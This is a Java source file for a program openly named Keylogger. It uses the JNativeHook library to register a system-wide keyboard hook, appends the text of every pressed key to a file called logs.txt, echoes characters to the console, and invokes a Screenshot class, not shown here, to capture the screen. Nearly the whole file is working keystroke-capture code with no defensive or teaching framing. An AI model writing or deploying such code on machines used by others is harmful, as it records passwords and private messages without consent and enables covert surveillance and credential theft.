/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package keylogger;
import org.jnativehook.GlobalScreen;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.jnativehook.mouse.NativeMouseEvent;
import org.jnativehook.mouse.NativeMouseMotionListener;
import java.io.FileWriter;
import java.io.BufferedWriter;
import java.util.*;

/**
 *
 * @author sparsha
 */

public class Keylogger implements NativeKeyListener{
    /**
     * @param args the command line arguments
     */
 
    static FileWriter fw;
    static BufferedWriter bw;
    public static void main(String[] args) {
        //TODO code application logic here
        try{
        GlobalScreen.registerNativeHook();
        
        fw=new FileWriter("logs.txt",true);
        bw=new BufferedWriter(fw);
        
        }catch(Exception e)
        {
            
        }
        

        
        GlobalScreen.addNativeKeyListener(new Keylogger());
        
        Screenshot s=new Screenshot("testimage");
        if(s.getscreenshot())
            System.out.println("got");
        
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nke) {
        try{
        fw=new FileWriter("logs.txt",true);
        bw=new BufferedWriter(fw);
        }
        catch(Exception e){
        }
        
     
        if(nke.getKeyCode()==NativeKeyEvent.VC_SPACE)
            try{
        bw.write(" ");
            }
        catch(Exception e)
        {
        }
        else
            try{
            bw.write(NativeKeyEvent.getKeyText(nke.getKeyCode()));
            System.out.print(nke.getKeyChar());
            }
        catch(Exception e)
        {
            
        }
        try{
        bw.close();
        fw.close();
        }catch(Exception e){
        
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nke) {        
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nke) {
    }
}